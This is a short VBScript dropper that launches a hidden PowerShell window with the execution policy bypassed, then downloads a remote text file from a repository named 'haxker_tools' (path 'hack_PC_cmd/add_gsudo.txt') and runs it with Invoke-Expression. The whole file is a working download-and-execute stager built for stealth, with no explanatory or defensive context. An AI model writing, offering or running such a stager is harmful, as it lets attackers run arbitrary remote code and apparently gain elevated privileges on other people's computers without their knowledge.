Set objShell = CreateObject("WScript.Shell")

Dim remoteUrl, psCommand
remoteUrl = "https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/hack_PC_cmd/add_gsudo.txt"

psCommand = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ""[Console]::OutputEncoding = [System.Text.Encoding]::UTF8; iex ([System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri '" & remoteUrl & "' -UseBasicParsing).Content))"""

objShell.Run psCommand, 0, False
